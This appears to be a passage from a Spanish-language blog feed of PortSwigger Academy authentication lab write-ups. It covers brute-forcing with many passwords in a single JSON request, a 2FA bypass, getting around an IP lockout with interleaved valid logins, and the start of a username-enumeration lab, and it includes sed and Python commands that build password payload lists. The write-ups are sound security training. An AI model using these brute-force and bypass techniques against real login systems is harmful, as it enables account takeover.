&lt;p&gt;Ahora que sabemos esto, intentaremos inyectar muchas mas contrasenas en esta misma peticion para evitar el bloqueo al realizar demasiados intentos, debemos saber que para enviar multiples valores en json se deben de enviar dentro de corchetes de la siguiente manera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;carlos&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;[&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;valor1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;valor2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;valor3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;err&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Para eso podemos usar el siguiente comando con &lt;code&gt;sed&lt;/code&gt; para que de nuestra lista de contrasenas crear la estructura y automatizarlo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/^/&amp;#34;/; s/$/&amp;#34;,/&amp;#39;&lt;/span&gt; passwords.txt
&lt;span class=&#34;s2&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;12345678&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;qwerty&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;123456789&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;12345&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;1234&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;111111&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;1234567&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;dragon&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;123123&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;baseball&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;abc123&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;football&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;monkey&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;letmein&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;shadow&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;master&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;666666&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;qwertyuiop&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;123321&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;mustang&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;1234567890&amp;#34;&lt;/span&gt;,
&lt;span class=&#34;s2&#34;&gt;&amp;#34;michael&amp;#34;&lt;/span&gt;,
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora los enviamos por &lt;code&gt;repeater&lt;/code&gt; de la siguiente manera para poder iniciar sesion, lo que nos devuelve una respuesta 302 por lo que ya contamos con una contrasena valida enviada en formato &lt;code&gt;json&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 176; 
			flex-basis: 422px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/repeater.png&#34; data-size=&#34;1537x873&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/repeater.png&#34;
			width=&#34;1537&#34;
			height=&#34;873&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/repeater_hu6a5683e46895ed87154ea0d0dcfcb756_104036_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/repeater_hu6a5683e46895ed87154ea0d0dcfcb756_104036_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Envio de peticiones con repeater&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Envio de peticiones con repeater&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con eso ya hemos ingresado al usuario de carlos:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 207; 
			flex-basis: 499px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/resuelto.png&#34; data-size=&#34;1753x843&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/resuelto.png&#34;
			width=&#34;1753&#34;
			height=&#34;843&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/resuelto_hued2b284d37bc28aab5ae0230afc93063_95319_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-6/resuelto_hued2b284d37bc28aab5ae0230afc93063_95319_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 7</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/</link>
        <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 7" /&gt;&lt;h1 id=&#34;lab-2fa-simple-bypass&#34;&gt;Lab: 2FA simple bypass&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es hacer un bypass al segundo factor de autenticacion, se nos da un email de cliente en el cual recibiremos el codigo y se nos da los usuarios &lt;code&gt;wiener&lt;/code&gt; y &lt;code&gt;carlos&lt;/code&gt; basandonos en estos haremos posible hacer el bypass para el usuario carlos.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;En el email de &lt;code&gt;wiener&lt;/code&gt; sera en el que recibiremos el correo con el codigo de seguridad al intentar iniciar con la contrasena &lt;code&gt;peter&lt;/code&gt;. Al iniciar sesion con las credenciales, luego se nos pide el codigo de seguridad.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 294; 
			flex-basis: 707px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/login.png&#34; data-size=&#34;1771x601&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/login.png&#34;
			width=&#34;1771&#34;
			height=&#34;601&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/login_hu2de989df32717fdd52ccdfb3d16924b1_57960_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/login_hu2de989df32717fdd52ccdfb3d16924b1_57960_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y si vamos a la pestana de email client recibimos el codigo de seguridad.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 219; 
			flex-basis: 526px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/email.png&#34; data-size=&#34;1787x815&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/email.png&#34;
			width=&#34;1787&#34;
			height=&#34;815&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/email_huf1e4820a0b41ae8d74a7f497031a2de2_138815_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/email_huf1e4820a0b41ae8d74a7f497031a2de2_138815_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Codigo de seguridad para usuario wiener&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Codigo de seguridad para usuario wiener&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso la manera de hacer el bypass es muy facil, practicamente la aplicacion no valida el codigo, ya con ingresar usuario y contrasena ya se puede entrar al sistema.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 368; 
			flex-basis: 883px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/history.png&#34; data-size=&#34;1138x309&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/history.png&#34;
			width=&#34;1138&#34;
			height=&#34;309&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/history_hu7102ed477f56197ac1e7b8e52d810a93_28628_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/history_hu7102ed477f56197ac1e7b8e52d810a93_28628_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Historial HTTP&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Historial HTTP&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Notamos que luego ingresar el codigo en &lt;code&gt;/login2&lt;/code&gt; redirigira a la pagina &lt;code&gt;/my-account&lt;/code&gt;. Si nos saltamos el enviar el codigo y vamos directamente a la pagina &lt;code&gt;/my-account&lt;/code&gt; ya habremos resuelto el lab.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;El sistema no valida nunca el codigo 2FA ya que sin ingresarlo ya puede ingresar a ciertos modulos de la aplicacion&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Y con eso ya hemos ingresado al usuario de carlos:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 191; 
			flex-basis: 459px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/resuelto.png&#34; data-size=&#34;1807x944&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/resuelto.png&#34;
			width=&#34;1807&#34;
			height=&#34;944&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/resuelto_hued56bc9624cf60dc16cc87fe0b7e4149_100581_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-7/resuelto_hued56bc9624cf60dc16cc87fe0b7e4149_100581_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/</link>
        <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 4" /&gt;&lt;h1 id=&#34;lab-broken-brute-force-protection-ip-block&#34;&gt;Lab: Broken brute-force protection, IP block&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es ingresar con la cuenta de carlos, pero tiene una funcionalidad que lo que hace es bloquear nuestra ip al maximo de intentos que son 3, despues de esos intentos sale una alerta que muestra que se estan realizando demasiados intentos.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, al intentar iniciar sesion podemos notar la respuesta del inicio de sesion al realizar mas de 3 intentos en el usuario &lt;code&gt;carlos&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 203; 
			flex-basis: 489px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/login.png&#34; data-size=&#34;1113x546&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/login.png&#34;
			width=&#34;1113&#34;
			height=&#34;546&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/login_hueb5317791af68144bd509c5846674762_31223_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/login_hueb5317791af68144bd509c5846674762_31223_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuesta al realizar muchos intentos de inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuesta al realizar muchos intentos de inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora que sabemos esto, se nos da un usuario valido que es &lt;code&gt;wiener&lt;/code&gt; con la contrasena &lt;code&gt;peter&lt;/code&gt; y al tratar de ingresar vemos que accede, pero algo importante al notar es que al iniciar sesion y luego se vuelve a intentar con el usuario &lt;code&gt;carlos&lt;/code&gt; si deja hacer un nuevo intento otra vez y a la tercera vez se bloquea. Por lo que se sabe que si iniciamos sesion con un usuario valido el contador vuelve a 0.&lt;/p&gt;
&lt;p&gt;Ahora queda armar los payloads para realizar el ataque, que es intentar con el usuario valido y luego con la contrasena para carlos para que el contador siempre vuelva a 0 cada que se intenta. Para eso utilizamos &lt;code&gt;intruder&lt;/code&gt; con el tipo de ataque &lt;code&gt;Pitchfork&lt;/code&gt; que lo que hara es el payload de posicion 1 se intente con el 1 y el 2 con el posicion 2 y asi sucesivamente.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Algo a notar es que los payloads set del 1 deben de ser igual en conteo al de payload set 2, es decir si el set 1 tiene 100 valores en su lista, debe tener los mismos en el set 2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;creacion-de-lista-usuarios&#34;&gt;Creacion de lista usuarios&lt;/h3&gt;
&lt;p&gt;Para eso y crear una lista de 200 ya que las contrasenas a intentar son 100, y se van a intercalar wiener y carlos&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;wiener&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;carlos&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;creacion-de-lista-contrasenas&#34;&gt;Creacion de lista contrasenas&lt;/h3&gt;
&lt;p&gt;Lo siguiente es intercalar entre las contrasenas que se probaran a carlos, por eso agregamos el valor &lt;code&gt;peter&lt;/code&gt; antes de cada linea con un salto de linea los que nos crea una lista de payloads.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/^/peter\n/&amp;#39;&lt;/span&gt; passwords.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora que tenemos los payloads hacemos lo siguiente de hacer el ataque de tipo &lt;code&gt;Pitchfork&lt;/code&gt; y los set de payloads como los mostrados, donde primero se prueba el usuario &lt;code&gt;wiener:peter&lt;/code&gt; luego &lt;code&gt;carlos:pass1,pass2,...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 210; 
			flex-basis: 504px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder.png&#34; data-size=&#34;1260x600&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder.png&#34;
			width=&#34;1260&#34;
			height=&#34;600&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder_hu13e04c537bb634ab0db80282e2bc36ff_79854_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder_hu13e04c537bb634ab0db80282e2bc36ff_79854_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Position&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Position&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 120; 
			flex-basis: 288px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder2.png&#34; data-size=&#34;562x467&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder2.png&#34;
			width=&#34;562&#34;
			height=&#34;467&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder2_huf2950eb89135190c058ac7b6a583255c_17856_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/intruder2_huf2950eb89135190c058ac7b6a583255c_17856_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder Payloads&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder Payloads&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al realizar el ataque ya podemos ver que &lt;code&gt;wiener:peter&lt;/code&gt; tiene respuesta de tipo &lt;code&gt;302&lt;/code&gt; asi que si se ingresa una contrasena valida a carlos este tambien sera la contrasena correcta como se muestra.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 308; 
			flex-basis: 741px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resultado.png&#34; data-size=&#34;880x285&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resultado.png&#34;
			width=&#34;880&#34;
			height=&#34;285&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resultado_hu155c50f5c9bf2b3d0722ad36755fab37_15859_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resultado_hu155c50f5c9bf2b3d0722ad36755fab37_15859_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del ataque de usuarios&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del ataque de usuarios&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ya con esto tenemos la contrasena y podemos iniciar sesion. Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 162; 
			flex-basis: 390px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resuelto.png&#34; data-size=&#34;1257x772&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resuelto.png&#34;
			width=&#34;1257&#34;
			height=&#34;772&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resuelto_huad37b116f87d93d87be469b8e7c9a84e_79258_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-4/resuelto_huad37b116f87d93d87be469b8e7c9a84e_79258_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/</link>
        <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 5" /&gt;&lt;h1 id=&#34;lab-username-enumeration-via-account-lock&#34;&gt;Lab: Username enumeration via account lock&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es ingresar con un usuario valido, pero antes debemos hacer una enumeracion para saber que usuario existe o no en la aplicacion.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Para resolver el ejercicio se nos da un listado de usuarios y contrasenas para realizar las pruebas, asi que con el uso de &lt;code&gt;intruder&lt;/code&gt; copiamos 4 veces los usuarios para que se traten de ingresar 4 veces con una contrasena cualquiera. Y aca hay un usuario que si existe se bloqueara por un minuto, como se muestra que el usuario &lt;code&gt;ar&lt;/code&gt; se bloquea.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 104; 
			flex-basis: 251px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/login.png&#34; data-size=&#34;787x751&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/login.png&#34;
			width=&#34;787&#34;
			height=&#34;751&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/login_hu76be6439ebe1323acc98597f038a123e_55149_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-5/login_hu76be6439ebe1323acc98597f038a123e_55149_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
